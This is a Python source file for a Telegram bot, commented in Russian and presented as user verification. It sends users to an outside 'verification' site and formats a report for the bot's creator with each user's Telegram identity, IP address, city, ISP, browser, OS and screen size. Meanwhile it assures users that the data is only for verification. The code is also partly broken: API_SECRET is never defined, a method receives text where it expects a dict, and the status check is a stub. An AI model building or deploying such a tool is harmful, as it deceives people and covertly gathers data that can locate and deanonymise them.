"""
Telegram Verification Bot
Основной модуль бота для верификации пользователей
"""

import logging
import asyncio
import secrets
from datetime import datetime
from typing import Dict, Optional

from telegram import (
    Update, 
    InlineKeyboardButton, 
    InlineKeyboardMarkup, 
    WebAppInfo
)
from telegram.ext import (
    Application, 
    CommandHandler, 
    CallbackQueryHandler, 
    ContextTypes, 
    MessageHandler, 
    filters
)

# Импортируем конфигурацию
from config import (
    BOT_TOKEN,
    CREATOR_CHAT_ID,
    WEBSITE_BASE_URL,
    DB_CONFIG,
    DEBUG,
    LOG_LEVEL,
    LOG_FILE,
    WELCOME_MESSAGE,
    SUCCESS_MESSAGE,
    ERROR_MESSAGE,
    TOKEN_EXPIRY,
    USE_WEBHOOK,
    WEBHOOK_PATH,
    WEBHOOK_FULL_URL,
    print_config_summary,
    validate_config
)

# Импортируем модуль базы данных
try:
    from database_mysql import init_database, save_verification_token, save_collected_data
    DB_TYPE = "MySQL"
except ImportError:
    try:
        from database import init_database, save_verification_token, save_collected_data
        DB_TYPE = "SQLite"
    except ImportError:
        print("❌ Не найден модуль базы данных")
        DB_TYPE = None

# Настройка логирования
def setup_logging():
    """Настройка системы логирования"""
    log_formatter = logging.Formatter(
        '%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        datefmt='%Y-%m-%d %H:%M:%S'
    )
    
    # Файловый обработчик
    file_handler = logging.FileHandler(LOG_FILE)
    file_handler.setFormatter(log_formatter)
    file_handler.setLevel(getattr(logging, LOG_LEVEL))
    
    # Консольный обработчик
    console_handler = logging.StreamHandler()
    console_handler.setFormatter(log_formatter)
    console_handler.setLevel(logging.INFO if DEBUG else logging.WARNING)
    
    # Настройка корневого логгера
    root_logger = logging.getLogger()
    root_logger.setLevel(logging.DEBUG if DEBUG else logging.INFO)
    root_logger.addHandler(file_handler)
    root_logger.addHandler(console_handler)
    
    # Отключаем логи от зависимостей
    logging.getLogger('httpx').setLevel(logging.WARNING)
    logging.getLogger('httpcore').setLevel(logging.WARNING)
    
    return root_logger

logger = setup_logging()

class VerificationBot:
    """Основной класс бота верификации"""
    
    def __init__(self):
        self.app = None
        self.active_tokens = {}  # Кэш активных токенов
        logger.info(f"Инициализация Verification Bot (БД: {DB_TYPE})")
        
    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Обработчик команды /start"""
        user = update.effective_user
        logger.info(f"Пользователь {user.id} ({user.username}) начал взаимодействие")
        
        # Генерация уникального токена
        token = secrets.token_urlsafe(32)
        
        # URL для верификации
        verification_url = f"{WEBSITE_BASE_URL}/verify?token={token}&user_id={user.id}"
        
        # Сохраняем информацию в кэш
        self.active_tokens[token] = {
            'telegram_id': user.id,
            'username': user.username,
            'first_name': user.first_name,
            'last_name': user.last_name,
            'created_at': datetime.now(),
            'status': 'pending'
        }
        
        # Сохраняем в базу данных
        if DB_TYPE:
            save_verification_token(
                telegram_id=user.id,
                username=user.username,
                first_name=user.first_name,
                last_name=user.last_name,
                token=token
            )
        
        # Создаем кнопку для верификации
        keyboard = [
            [
                InlineKeyboardButton(
                    "🔐 Пройти верификацию",
                    web_app=WebAppInfo(url=verification_url)
                )
            ],
            [
                InlineKeyboardButton(
                    "🌐 Открыть в браузере",
                    url=verification_url
                )
            ]
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        # Отправляем приветственное сообщение
        await update.message.reply_text(
            WELCOME_MESSAGE,
            reply_markup=reply_markup,
            parse_mode='HTML'
        )
        
        logger.info(f"Создан токен верификации для пользователя {user.id}: {token[:10]}...")
    
    async def status_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Проверка статуса верификации"""
        user = update.effective_user
        
        # Здесь должна быть проверка статуса из БД
        # Временная заглушка
        await update.message.reply_text(
            "📊 Статус верификации: Не пройдена\n"
            "Используйте /start для начала верификации.",
            parse_mode='HTML'
        )
    
    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Команда помощи"""
        help_text = """
🤖 *Команды бота:*

/start - Начать верификацию
/status - Проверить статус верификации
/help - Показать это сообщение

🔒 *Процесс верификации:*
1. Нажмите /start
2. Пройдите проверку на сайте
3. Получите доступ к функциям бота

⚠️ *Безопасность:* 
Все данные защищены и используются только для проверки.
        """
        await update.message.reply_text(help_text, parse_mode='Markdown')
    
    async def receive_data_webhook(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Обработка данных с веб-сервера"""
        try:
            # Получаем данные из webhook
            data = update.message.text if update.message else None
            
            if data and 'verification_data' in data:
                # Парсим данные
                # Здесь должна быть логика обработки данных с веб-сервера
                logger.info(f"Получены данные верификации: {data[:100]}...")
                
                # Отправляем уведомление создателю
                await self.send_notification_to_creator(data)
                
                # Отвечаем пользователю
                if update.effective_user:
                    await update.message.reply_text(SUCCESS_MESSAGE)
            
        except Exception as e:
            logger.error(f"Ошибка обработки webhook: {e}")
            await update.message.reply_text(ERROR_MESSAGE)
    
    async def send_notification_to_creator(self, data: dict):
        """Отправка уведомления создателю бота"""
        try:
            message = self.format_notification_message(data)
            
            # Отправляем сообщение создателю
            # В реальном коде здесь будет отправка через context.bot.send_message
            logger.info(f"Уведомление для создателя: {message[:200]}...")
            
            # Для теста выводим в лог
            print(f"\n📨 УВЕДОМЛЕНИЕ СОЗДАТЕЛЮ:")
            print(message)
            print("-" * 50)
            
        except Exception as e:
            logger.error(f"Ошибка отправки уведомления: {e}")
    
    def format_notification_message(self, data: dict) -> str:
        """Форматирование сообщения с данными"""
        message = f"""
🚨 *НОВЫЕ ДАННЫЕ ВЕРИФИКАЦИИ*

👤 *Пользователь:*
├ ID: {data.get('telegram_id', 'N/A')}
├ Username: @{data.get('username', 'N/A')}
├ Имя: {data.get('first_name', 'N/A')}
└ Фамилия: {data.get('last_name', 'N/A')}

🌐 *Сетевые данные:*
├ IP: {data.get('ip', 'N/A')}
├ Страна: {data.get('country', 'N/A')}
├ Город: {data.get('city', 'N/A')}
└ Провайдер: {data.get('isp', 'N/A')}

🖥️ *Устройство:*
├ Браузер: {data.get('browser', 'N/A')}
├ ОС: {data.get('os', 'N/A')}
├ Платформа: {data.get('platform', 'N/A')}
└ Разрешение: {data.get('screen', 'N/A')}

🕐 *Время:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        """
        return message
    
    def setup_handlers(self):
        """Настройка обработчиков команд"""
        self.app.add_handler(CommandHandler("start", self.start_command))
        self.app.add_handler(CommandHandler("status", self.status_command))
        self.app.add_handler(CommandHandler("help", self.help_command))
        
        # Обработчик для данных с веб-сервера
        self.app.add_handler(MessageHandler(
            filters.TEXT & ~filters.COMMAND, 
            self.receive_data_webhook
        ))
        
        logger.info("Обработчики команд настроены")
    
    async def setup_webhook(self):
        """Настройка webhook для продакшена"""
        if USE_WEBHOOK:
            await self.app.bot.set_webhook(
                url=WEBHOOK_FULL_URL,
                secret_token=API_SECRET
            )
            logger.info(f"Webhook настроен: {WEBHOOK_FULL_URL}")
        else:
            logger.info("Используется polling режим")
    
    async def run(self):
        """Запуск бота"""
        try:
            # Проверка конфигурации
            if not print_config_summary():
                logger.error("Ошибки в конфигурации. Бот не запущен.")
                return
            
            # Инициализация базы данных
            if DB_TYPE:
                if init_database():
                    logger.info(f"База данных {DB_TYPE} инициализирована")
                else:
                    logger.error(f"Ошибка инициализации БД {DB_TYPE}")
            
            # Создание приложения
            self.app = Application.builder().token(BOT_TOKEN).build()
            
            # Настройка обработчиков
            self.setup_handlers()
            
            # Настройка webhook или polling
            if USE_WEBHOOK:
                await self.setup_webhook()
                await self.app.run_webhook(
                    listen="0.0.0.0",
                    port=8443,
                    webhook_url=WEBHOOK_FULL_URL,
                    secret_token=API_SECRET
                )
            else:
                logger.info("Запуск бота в polling режиме...")
                await self.app.run_polling(allowed_updates=Update.ALL_TYPES)
                
        except Exception as e:
            logger.error(f"Критическая ошибка при запуске бота: {e}")
            raise

def main():
    """Точка входа в приложение"""
    bot = VerificationBot()
    
    # Запуск бота
    asyncio.run(bot.run())

if __name__ == '__main__':
    main()
